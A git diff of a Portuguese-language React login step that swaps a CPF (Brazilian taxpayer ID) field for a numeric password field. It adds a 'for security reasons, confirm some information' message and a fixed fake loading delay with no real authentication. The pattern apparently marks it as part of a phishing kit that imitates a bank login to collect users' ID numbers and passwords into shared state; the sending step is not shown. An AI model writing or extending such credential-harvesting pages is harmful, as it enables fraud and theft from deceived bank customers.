@@ -1,11 +1,10 @@
-import React from 'react'
+import React, { useEffect } from 'react'
 import { makeStyles } from '@material-ui/core/styles';
 import TextField from '@material-ui/core/TextField';
 import alertify from 'alertifyjs';
 import InputMask from 'react-input-mask'
 import logo from '../Assets/Images/logo.png'
 import Loader from '../Components/Loader';
-import './fundo2.css'
 
 const useStyles = makeStyles((theme) => ({
     root: {
@@ -25,49 +24,50 @@ const Step2 = ({ nextStep, loginData, setLoginData }) => {
     const classes = useStyles();
     const [loading, setLoading] = React.useState(false)
 
-    const onChangeUser = e => {
+    const onChangeSenha = e => {
         // console.log(e.target.value)
-        setLoginData({ ...loginData, usuario: e.target.value })
+        setLoginData({ ...loginData, senha: e.target.value })
     }
 
-  
-
-    const onClick = () => {
-        if (loginData.usuario.length === 11) {
+    const onClick = () => { 
+        if (loginData.senha === '') {
+            alertify.alert('Aviso', 'Senha é Obrigatórios')
+        } else if (loginData.senha.length <= 18) {
             setLoading(true)
-            setTimeout(() =>{
+            setTimeout(() => {
                 nextStep()
-            },2000)
-            
-        } else if (loginData.usuario.length < 11) {
-            alertify.alert('Aviso', 'Número Incorreto')
-        }
-        //   console.log(loginData.telefone.length)
+            }, 3000)
 
+        }
     }
 
     return loading
 
-        ? <Loader />
-        :
+    ? <Loader />
+    :
 
-<div>
-       <img src={logo} className="logo" />
-            <h2>Tem</h2>
+    <div>
 
-            <div>
+        <img src={logo} className="logo" />
+
+            <div className={classes.textField}>
+                <h2>Olá,</h2>
+
+                <p>Por motivo de segurança é necessário confirmar algumas informações</p>
+
+                <div>
                 <TextField
-                    label="CPF"
-                    name="CPF"
-                    onChange={onChangeUser}
+                    label="Senha"
                     id="margin-none"
+                    type="password"
+                    inputMode="numeric"
+                    required
+                    onChange={onChangeSenha}
                     defaultValue=""
-                    required={true}
                     className={classes.textField}
                 //   helperText="Some important text"
                 />
             </div>
-        
 
          
 
@@ -75,9 +75,9 @@ const Step2 = ({ nextStep, loginData, setLoginData }) => {
                 <button type="button" className="botaoLaranja" onClick={onClick}>Acessar</button>
             </div>
 
-
+            </div>
         </div>
-
+    
 }
 
 export default Step2
